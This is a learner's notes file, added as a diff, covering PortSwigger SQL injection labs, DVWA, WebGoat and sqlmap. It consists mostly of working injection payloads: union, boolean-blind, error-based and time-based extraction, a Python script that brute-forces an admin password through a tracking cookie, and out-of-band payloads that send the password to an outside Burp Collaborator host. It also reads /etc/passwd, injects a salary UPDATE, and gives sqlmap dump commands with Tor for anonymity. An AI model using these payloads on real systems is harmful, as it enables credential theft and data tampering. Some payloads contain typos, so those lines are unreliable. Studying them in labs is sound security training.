@@ -1,1 +1,538 @@
+## Portswigger Sql Injection Course Note
+	
+LAB#1
+--
+URl
+SQL INJECTION PRODUCT CATEGORY 
+`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+ANalysis
+`SELECT * FROM products WHERE category = ''' AND released = 1 `
+`SELECT * FROM products WHERE category = ''--' AND released = 1`
+`SELECT * FROM products WHERE category = ''OR 1=1 --' AND released = 1`
+NOTE
+	-- nullifies the rest of the query
+
+LAB#2 LOGIN
+--
+goal login to admin user
+	steps 
+		intercept request using burpsuite
+		modify username to administrator' --
+
+ANALYSIS
+	select firstname from user WHERE username = 'admin' And password = 'admin'
+	select firstname from user WHERE username = ''' And password = 'admin'
+	select firstname from user WHERE username = 'administrator' --' And password = 'admin'
+	select firstname from user WHERE username = 'administrator' or 1=1' And password = 'admin'
+
+
+
+LAB#3
+--
+SQLI- UNION ATTACK 
+
+	GOAL ; DETERMINING NUMBER OF COLUMNS RETURNED BY A QUERY
+RULES
+	    The individual queries must return the same number of columns.
+		The data types in each column must be compatible between the individual queries.
+
+E.G 
+SELECT a, b FROM table1 UNION SELECT c, d from table2
+
+SQLI ATTACK (#1)
+SELECT ? from table1 UNION SELECT NULL
+-ERROR->> incorrect number of colums 
+SELECT ? from table1 UNION SELECT NULL, NULL
+-200 RESPONSE CODE -->  CORRECT NUMBER OF COLUMNS
+
+
+SQLI ATTACK (#2)
+SELECT a,b FROM TABLE1 ORDER BY 1
+SELECT a,b FROM TABLE1 ORDER BY 2
+
+NOTE 
+
+ On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:
+		     ' UNION SELECT NULL FROM DUAL--
+		PRINTING DATABASE VERSION
+				Oracle
+						SELECT banner FROM v$version   SELECT version FROM v$instance   `
+				Microsoft
+						SELECT @@version`
+				PostgreSQL
+						SELECT version()`
+				MySQL
+						SELECT @@version
+	STRING CONCATENATION
+			Oracle
+				'foo'||'bar'`
+			Microsoft
+				'foo'+'bar'`
+			PostgreSQL
+				'foo'||'bar'`
+			MySQL
+				'foo' 'bar'` [Note the space between the two strings]  
+			     CONCAT('foo','bar')`
+			     
+			     
+			     
+LAB#4 UNION ATTACK 
+--
+	 SQLI UNION ATTACK -- FINDING A COLUMN CONTAINING TEXT
+		 STEP(#1)
+		 SELECT a, b, c FROM TABLE1 UNION SELECT 'a', NULL, NULL
+			 --error ->- column is not type string
+			 200-> column is of type string
+
+ANALYSIS
+	' UNION SELECT 'a', NULL, NULL --
+	' UNION SELECT '7Y7u2a, NULL, NULL --	
+
+
+
+LAB#5 RETREIVING INTERESTING infos
+--
+SQLI- RETREIVING INTERESTING DATAS
+RETREIVING DATA FROM OTHER TABLES
+
+GOAL ; RETREIVE ALL USERNAMES AND PASSWORDS AND USE THE INFO TO LOGIN AS ADMINISTRATOR
+
+ANALYSIS
+
+DETERMINE # OF COLUMNS IN THE TABLE
+	'ORDER BY 1--
+	'ORDER BY 2--
+	
+DETERMINE TYPE OF DATA IN THE COLUMN
+	'UNION SELECT 'A',NULL
+	'UNION SELECT NULL,'A',
+	--> BOTH COLUNMS ARE STRINGS
+
+OBTAINING PASSWORD AND USERNAME 
+ ' UNION SELECT USERNAME, PASSWORD FROM USERS--       
+ ADMINISTRATOR
+ 6mffe94usq37m1q29z5d
+
+LAB#6 CONCATENATING MULTIPLE COLUMNS  
+--
+SQLI -- CONCATENATING INFORMATIONS INTO ONE COLUMN
+
+GOAL-- PRINT OUT THE USERNAME AND PASSWORD IN ONE COLUNM
+ANALYSIS 
+
+DETERMINE # OF COLUMNS IN THE TABLE 
+' ORDER BY 1--
+' ORDER BY 2--
+
+DETERMINE DATA TYPE OF THE INFORMATIONS
+
+' UNION SELECT 'a', NULL--
+-ERROR_> DATA IN THE FIRST COLUMNS ARE INTEGERS
+' UNION SELECT NULL,'a'--
+--200-> DATA IN THE SECOND COLUMN ARE STRINGS
+
+PRINTING THE DATABASE VERSION 
+ ' union SELECT NULL, Version()--
+ 
+
+OUTPUT THE USERNAME AND PASSWORD IN ONE COLUNM
+' UNION SELECT NULL, username || '~' || password FROM users--
+
+administrator~y0q8hwouok2cl972hqi2
+wiener~et8jnr8k9bj8focojpeo
+carlos~fsbyrz15l2iduhlraode
+
+LAB#7 BLIND SQLI WITH CONDITIONAL STATEMENT
+------
+
+SQLI-- BLIND SQL INJECTION WITH CONDITIONAL STATEMENT 
+VULNERABLE PARAMETERM-- TRACKING COOKIE
+GOAL --> ADMINISTRATION PASSWORD
+
+
+ANALYSIS-
+
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN'
+
+-   ﻿> If this tracking id exists -> query returns value -> Welcome back message
+-   ﻿> If the tracking id doesn't exist -> query returns nothing -> no Welcome back
+message
+
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND 1=1--
+TRUE--> welcome message
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND 1=0--
+FALSE--> NO WECOME MESSGE 
+
+#1 CONFIRM THAT WE HAVE USER TABLE 
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND (Select 'x' from users LIMIT 1)= 'x'--  
+--> true user table exist
+
+#2 CONFIRM THAT THERE IS A USERNAME COLUMN IN THE TABLE AND THE ADMIN PARAMETER IS PRESENT
+
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND (SELECT USERNAME FROM USERS WHERE USERNMAE = 'ADMINISTRATOR' ) = 'ADMINISTRATOR' -- '
+--> TRUE
+
+#3 ENUMERATE THE ADMIN PASSWORD
+
+DETERMINING PASSWORD LENGHT
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND (SELECT USERNAME FROM USERS WHERE USERNMAE = 'ADMINISTRATOR' AND LENGHT(PASSWORD) >1) = 'ADMINISTRATOR' -- '
+--> TRUE
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND (SELECT USERNAME FROM USERS WHERE USERNMAE = 'ADMINISTRATOR' AND LENGHT(PASSWORD) >2) = 'ADMINISTRATOR' -- '
+-->TRUE ........
+..........
+TILL FALSE
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND (SELECT USERNAME FROM USERS WHERE USERNMAE = 'ADMINISTRATOR' AND LENGHT(PASSWORD) >20) = 'ADMINISTRATOR' -- '
+--> FALSE PASSWORD IS NOT GREATER THAN 20
+
+select tracking-id from tracking-table where trackingId = 'RVLfBu6s9EZRIVYN' AND (SELECT SUBSTRING(PASSWORD, 1,1 ) FROM USERS WHERE USERNMAE = 'ADMINISTRATOR')  = 'A' -- '
+
+USE BURPSUITE TO BRUTEFORCE THE ENTRIES
+
+USING PYTHON FOR THE SCRIPTING
+
+  
+```python
+	import sys
+		import requests
+		import urllib3
+		import urllib
+		
+		urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+		
+		proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+		
+		def sqli_password(url):
+		    password_extracted = ""
+		    for i in range(1,21):
+		        for j in range(32,126):
+		            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
+		            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+		            cookies = {'TrackingId': 'dCqiyv8E4BfhhpHL' + sqli_payload_encoded, 'session': 'bdb4dZfXEcfucciq98jCIYBJW4NL7y7M'}
+		            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+		            if "Welcome" not in r.text:
+		                sys.stdout.write('\r' + password_extracted + chr(j))
+		                sys.stdout.flush()
+		            else:
+		                password_extracted += chr(j)
+		                sys.stdout.write('\r' + password_extracted)
+		                sys.stdout.flush()
+		                break
+		
+		def main():
+		    if len(sys.argv) != 2:
+		        print("(+) Usage: %s <url>" % sys.argv[0])
+		        print("(+) Example: %s www.example.com" % sys.argv[0])
+		
+		    url = sys.argv[1]
+		    print("(+) Retrieving administrator password...")
+		    sqli_password(url)
+		
+		if __name__ == "__main__":
+		    main()
+```
+
+
+
+LAB#8 EXAMINING ORACLE DATABASE 
+--
+QUERYING DATABASE TYPE AND VERSION  ON ORACLE
+	SQLI- PRODUCT CATEGORY FILTER
+	ENDGOAL--> PRINT DATABASE TYPE AND VERSION
+
+ANALYSIS
+	#1 determine number of column in the table
+	'order by 2--'
+	#2 determine data type of the table
+	' UNION SELECT 'a','a' FRom DUAL--
+	(since its an oracle database we have to use a dummy table provided by default called dual)
+	#3 output the database version 
+		 for oracle database select banner from v$version
+		 ' union select banner, null from v$version-- 
+
+
+
+LAB#9 EXAMINING MYSQL AND MICROSOFT DATABASE
+--
+
+GOAL OUTPUT DATABASE TYPE AND VERSION
+
+ANALYSIS
+DETERMINE NUMBER OF COLUMNS IN THE DATABASE 
+ 'UNION SELECT NULL, NULL --
+' ' order by 2--
+
+DEtermine data type
+	'union select 'a', 'a'--
+
+Ouptput the version
+' union select null, version
+
+
+LAB#10 LISTING DATABASE CONTENT ON NON ORACLE DATABASE
+--
+SQLI PRODUCT FILTER
+END-GOAL RETRIEVE TABLE NAMES, RETRIEVE LOGIN DETAILS IN IT AND LOGIN AS ADMINISTRATOR
+
+USING UNION BASED SQL
+
+ANALYSIS
+
+#1 FINDING NUMBER OF COLUMN IN THE TABLE 
+' ORDER BY 2-- '
+
+#2 FINDING DATA TYPE
+'UNION SELECT NULL, 'a' --
+
+#3 output database version
+ since its non-oracle it should either be postgresql, microsoft sql or mysql
+ microsoftsql and mysql @@version
+	    ' union select null, @@version --
+ postgresql version()
+	   ' union select null, version() --
+		   PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+		   	   
+#4 OUTPUT LIST OF TABLES IN THE DATABASE 
+	' UNION SELECT table_name, NULL FROM information_schema.tables --
+	 users_kcbtjc
+	 
+#5 output column name from users_kcbtjc
+
+' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_kcbtjc' --
+columns 
+--->username_pvcyrs
+--->password_qgoybt
+
+#6 output informations fron the tables
+' union select username_pvcyrs, password_qgoybt from users_kcbtjc --
+
+-->>administrator
+-->w6n4y4yuxkpe0vbmox6n
+LAB#11 LISTING CONTENT ON ORACLE DATABASE
+--
+SQLI ON CATEGORY FILE
+END-GOOAL
+DISPLAY DATABASE CONTENT
+LOGIN AS ADMIN
+
+ANALYSIS 
+--> DEtermine number of columns in the table 
+	' order by 2 --'
+--> determine the table data type
+	' union select 'a','a' --
+--> determine the database version
+	 ' union select banner, NULL from v$version --
+	 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+--> display the tables in the database 
+	'union select table_name, null from all_tables --
+		USERS_XBFPGN
+		
+--> display all the colums in the users table 
+	' union select column_name, null from all_tab_columns where table_name = 'USERS_XBFPGN' --
+	--> USERNAME_NYIHKU	
+	--> PASSWORD_WNBRGB
+	`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE`
+	--> exfiltrate  the password and username
+		' union select USERNAME_NYIHKU, PASSWORD_WNBRGB from USERS_XBFPGN  --
+			--> administrator
+			--> bk70g5mo0cagtdmxtf4o
+
+LAB #12 BLIND SQLI WITH CONDITIONAL ERROR
+--
+VULNERABLE PARAMETER -- TRACKING COOKIE 
+
+END-GOAL --> RETRIEVE ADMINISTRATOR PASSWORD
+
+ANALYSIS 
+
+			NOTE ERROR = TRUE
+					200 OK = FALSE
+#1 CONFIRM the parameter VULNERABLE TO SQL INJECTION 
+
+ ' -->RETURNS NO ERROR
+--> ' || (SELECT '' ) || ' --  (THIS SHOULD RETURN AN ERROR IN OTHER DBs)
+	RETURNS NO ERROR 
+--> ' || (SELECT ' ' FROM DUAL ) || ' --     (is an oracle db)
+	RETURNS AN ERROR 
+		THEREFORE PARAMETER IS AN ORACLE DATABASE AND IS VULNERABLE TO SQLI 
+
+#2 CONFIRm THAT THE USER TABLE EXIST 
+	--> ' || (SELECT ' ' FROM users WHERE rownum = 1 ) || ' -- 
+		--> users table exist 
+#3 confirm that the administrator user exist 
+	' || (SELECT ' ' FROM users WHERE username = 'administrator' ) || ' --    --> returns 200 either ways 
+	-->>	' || (SELECT case WHEN (1 =1 ) then _ else_END from dual ) || ' -- 
+				To_char() --> an oracle function that converts number or date to string 
+		__>>' || (SELECT case when (1=1) then TO_CHAR (1/0) ELSE '' END FROM users WHERE username ='administrator')  || ' 
+			 --> internal error therefore user exist
+		__>>' || (SELECT case when (1=1) then TO_CHAR (1/0) ELSE '' END FROM users WHERE username ='adminuytdfghg')  || ' 
+			-->200 ok -- user does not exist 
+#4 DETERMINE LENGHT OF PASSWORD
+__>' || (SELECT case when (1=1) then TO_CHAR (1/0) ELSE '' END FROM users WHERE username ='administrator' AND lenght(password)>1)  || ' 
+	--> error -- therefore password is more than 1
+__>' || (SELECT case when (1=1) then TO_CHAR (1/0) ELSE '' END FROM users WHERE username ='administrator'  AND lenght(password)>50)  || '
+	--> 200 -- therefore password is less 50
+__>' || (SELECT case when (1=1) then TO_CHAR (1/0) ELSE '' END FROM users WHERE username ='administrator' AND lenght(password)>20)  || ' 
+	-->200 ok -- password is not bigger than 20 
+			(bruteforce with burpsuite)
+#5 output the Administrator password
+__>' || (SELECT case when (1=1) then TO_CHAR (1/0) ELSE '' END FROM users WHERE username ='administrator' AND substr(password 1,1) = 'a')  || '
+
+-- >>' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where  username='administrator' and substr(password,1,1)='a') || ' 	
+(bruteforce using burpsuite)
+
+' || (select case where (1=1) then TO_CHAR(1/0) else '' end From user where username = 'administrator' And subsr(password, 1,1) = 'a' )'
+' || (select case where (1=1) then TO_CHAR(1/0) else '' end From user where username = 'administrator' And lenght(password)>1 ) || '
+
+----->>>>>>>> 8zaaci2a3boy732viyzi
+							izyiv237yob3a2icaaz8
+							izyiv237yob3a2icaaz8
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' 
+--->:>qospy503ffpyffttfgf4
+
+LAB#13 BLIND SQL WITH TIME DELAY
+--
+BLIND SQL WITH TIME DELAY
+
+VULNERABLE PARAMETER --> TRACKING COOKIE
+
+END GOAL --> PROVE THAT THE PARAMETER IS VULNERABLE TO BLIND SQLI (TIME-BASED)
+
+ANALYSIS
+	MYSQL --> ' || (SELECT SLEEP(10))  --
+	POSTGRESQL --> ' || (SELECT pg_sleep(10)) --  --> true 
+	ORACLE --> ' || (dbms_pipe.receive_message(('a'),10)) --
+	MICROSOFT --> ' || (dbms_pipe.receive_message(('a'),10)) --
+
+---->>>> bpk9rzp4a8shwx6pm61r
+
+LAB#14 BLIND SQLI TIME BASED WITH INFORMATION RETRIEVAL 
+--
+
+VULNERABLE PARAMETER -- TRACKING COOKIE
+END GOAL --> EXPLOIT THE VULNERABILITY AND RETRIEVE THE ADMINISTRATOR'S PASSWORD 
+
+ANALYSIS
+
+#1 -->> CONFIRM THAT THE PARAMETER IS VULNERABLE TO TIME BASED SQLI
+----->> ' || pg_sleep(10) --
+
+#2 --> confirm that the user table exist
+---->> ' || SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END -- 
+---->> ' || (SELECT CASE WHEN (table_name = 'users') THEN pg_sleep(10) ELSE pg_sleep(0) END from information_schema.tables) -- 
+----> ' || (SELECT CASE WHEN (column_name = 'username' ) THEN pg_sleep(10) ELSE pg_sleep(0) END from information_schema.columns WHERE table_name = 'users') -- 
+---->' || (SELECT CASE WHEN (username = 'administrator' ) THEN pg_sleep(10) ELSE pg_sleep(4) END from users) -- 
+
+#3 --> enumerate the lenght of the password 
+-->>> ' || ( SELECT CAASWE WHERE ( username = 'administrator AND lenght(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+-->>>  ' || ( SELECT CAASWE WHERE ( username = 'administrator AND lenght(password)>25) THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+
+-->> passsword = lenght (20)
+
+#4  --> enumerate the password
+-->>> ' || ( SELECT CASE WHERE ( username = 'administrator' AND substring(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+
+-->>> ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+
+
+
+LAB #15 BLIND SQL WITH OUT OF BAND INTERACTION 
+--
+SQLI 
+
+VULNERABLE PARAMETER -->>> TRACKING COOKIE
+
+ONLY WORKS ON PRO BURP VERSION \
+		ANALYSIS 
+		ORACLE -->>> ' || SELECT EXTRACTVALUE(xmltype(''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual --
+		MICROSOFT -->>> ' || exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' --
+		POSTGRESQL -->>> ' ||copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' --
+		MYSQL -->>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') --
+		 -->>.. (ONLY FOR WINDOWS)
+		SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+
+
+LAB #16 Blind SQL injection with out-of-band data exfiltration
+---
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1) Exploit SQLi to output the password of the administrator user
+2) Login as the administrator user
+
+ANALYSIS 
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 
+
+
+LAB #17  SQL injection with filter bypass via XML encoding
+--
+VULNERABLE PARAMETER -- STOCK CHECK FEATURE 
+END GOAL -- EXPLOIT THE VULNERABILITY AND RETRIEVE THE ADMIN LOGIN CREDENTIALS
+
+ANALYSIS 
+-->> check number of columns ( encode with hackvertor hex entities)
+1 UNION SELECT NULL
+-->> EXTRACT USERNAME AND PASSWORD 
+1 UNION SELECT username || '~' || password from users
+
+-->>administrator-8y6hcm6kp9e449c7ngu2	
+
+
+
+DVWA ----
+--
+DOCKER sudo docker run --rm it -p 80:80 vulnerables/dvwa 
+
+
+SQLI YT
+--
+
+')) UNION/**/SELECT/**/id, '
+
+insert into users (username, password) value ('teja', 'pwoijg,)
+
+union select sleep(5),2,3,4,5'6
+
+LOAD_FILE(filename )
+union select load_file('/etc/passwd'), 2,3,4,5,'6
+union select hex(load_file('/etc/passwd')), 2,3,4,5,'6
+		| xxd -r -p (for decoding the hex)
+
+WEBGOAT 
+
+docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/webgoat
+		[http://127.0.0.1:8080/WebGoat](http://127.0.0.1:8080/WebGoat)
+UPDATE (webgoat)
+		jsmith'; UPDATE salaries set salaries=1500 where username='funaya' ;--
+INSERT
+		insert into users (userid,salary) values ('teal',1500) ';
+
+SQLMAP
+--
+intercept. the request using burpsuite
+save the request to desktop
+sqlmap -r /root/Desktop/request.txt --dbs
+		-- will display all the vulnerabilities and display all databases
+
+sqlmap -r /root/Desktop/request.txt --D 'db name' --tables
+		-- displays all the tables in the database 
+
+sqlmap -r /root/Desktop/request.txt --D 'db name' --T 'tablename' --dump
+
+docker run --rm -it -p 80:80 vulnerable/dvwa
+
+--batch (automates the process )
+--password (to dump and crack password hashes )
+
+(anonimity on sqlmap)
+--tor 
+
+--level 
+--level=1. (get+post)
+--level=2(http cookie)
+--level=3 (http user-agent / referrer)
+--level=4 (enables more payload )
+--level=5 (http host-)
+
 
